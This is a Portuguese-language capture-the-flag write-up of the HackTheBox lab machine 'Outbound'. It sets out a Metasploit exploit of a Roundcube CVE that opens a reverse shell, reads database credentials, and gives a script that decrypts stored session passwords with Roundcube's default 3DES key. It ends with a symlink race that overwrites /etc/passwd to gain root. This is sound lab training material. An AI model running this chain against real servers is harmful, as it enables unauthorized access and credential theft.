# HackTheBox - Outbound (Write-up)

Este é um write-up detalhado da máquina **Outbound** no HackTheBox.  
O objetivo foi explorar vulnerabilidades no serviço de e-mail **Roundcube**, escalar privilégios e capturar as flags de `user.txt` e `root.txt`.

---

## 📌 Sumário
- [Reconhecimento](#-reconhecimento)
- [Acesso Inicial](#-acesso-inicial)
- [Exploração do Roundcube](#-exploração-do-roundcube)
- [Decodificando Credenciais](#-decodificando-credenciais)
- [Movendo para SSH](#-movendo-para-ssh)
- [Escalada de Privilégios](#-escalada-de-privilégios)
- [Flags](#-flags)
- [Conclusão](#-conclusão)

---

## 🔎 Reconhecimento

Primeiro, realizei um scan com **nmap** e **dirsearch** para encontrar subdomínios.  
Resultado: apenas as portas **22 (SSH)** e **80 (HTTP)** estavam abertas.

Adicionei o host ao `/etc/hosts`:

```
10.10.11.77 outbound.htb
```

---

## 🔑 Acesso Inicial

A plataforma nos forneceu as credenciais:

```
tyler / LhKL1o9Nm3X2
```

Com elas, foi possível logar em `outbound.htb`.  
O site disponibilizava um **webmail** baseado no **Roundcube**, em versão vulnerável.

---

## 💥 Exploração do Roundcube

A vulnerabilidade **CVE-2025-49113** foi explorada com o **Metasploit**:

```jsx
msfconsole
search roundcube
use 'version displayed'
```

Configuração do exploit:

```jsx
set HOST mail.outbound.htb
set RHOSTS 10.10.11.77
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set LHOST tun0
set VHOST mail.outbound.htb
run
```

Resultado: shell como `www-data@mail.outbound.htb`.

---

## 📂 Decodificando Credenciais

Após obter uma shell, acessei o arquivo de configuração:

```bash
cat /var/www/html/roundcube/config/config.inc.php
```

Com isso, consegui acessar o banco de dados MySQL:

```bash
mysql -u roundcube -p   # senha: RCDBPass2025
use roundcube;
select * from session;
```

Isso revelou credenciais armazenadas em **base64 + 3DES**.  
Usei o script abaixo para decodificar:

```python
from base64 import b64decode
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

data = {
    'password': 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/',
    'auth_secret': 'DpYqv6maI9HxDL5GhcCd8JaQQW',
    'request_token': 'TIsOaABA1zHSXZOBpH6up5XFyayNRHaw'
}

KEY = b'rcmail-!24ByteDESkey*Str'

def decrypt_3des(value):
    try:
        raw = b64decode(value)
        iv = raw[:8]
        ciphertext = raw[8:]
        cipher = DES3.new(KEY, DES3.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ciphertext), DES3.block_size)
        return decrypted.decode('utf-8')
    except Exception as e:
        return f"Erro: {e}"

for k, v in data.items():
    print(f"{k.upper()}: {decrypt_3des(v)}")
```

---

## 🖥️ Movendo para SSH

Com as credenciais decodificadas, tentei acesso via SSH:

```bash
ssh jacob@10.10.11.77

# ops, It does not work
```

Então, verifiquei a inbox de Jacob:

```bash
cat /home/jacob/mail/INBOX/jacob
```

Encontrei uma senha válida:

```
gY4Wr3a1evp4
```

Agora, o acesso via SSH funcionou. 🎉

---

## 🚀 Escalada de Privilégios

Com acesso ao usuário `jacob`, explorei os diretórios de log:

```bash
ls -lR /var/log
```

Foi encontrado `error_root.log`, vulnerável a **symlink**.  
Utilizei o seguinte exploit:

```bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
```

Se ocorrer erro no `cp`, use o loop:

``` .
while true; do
  rm -f /var/log/below/error_root.log
  ln -s /etc/passwd /var/log/below/error_root.log
  cp /tmp/fakepass /var/log/below/error_root.log && break
done
. ```

Agora, basta trocar para o usuário `pwn`:

```bash
su pwn
```

---

## 🏁 Flags

**User Flag**:

```bash
cat /home/jacob/user.txt
```

**Root Flag**:

```bash
cat /root/root.txt
```

---

## ✅ Conclusão

A máquina **Outbound** explorou uma cadeia interessante:

1. Credenciais iniciais → acesso ao Roundcube.  
2. Exploração do Roundcube (CVE) → shell web.  
3. Decodificação de credenciais (MySQL + 3DES).  
4. Movimento lateral via SSH.  
5. Escalada de privilégios com symlink em logs.  
6. Captura das flags `user.txt` e `root.txt`.  

```
Status: PWNED 🏴‍☠️
```
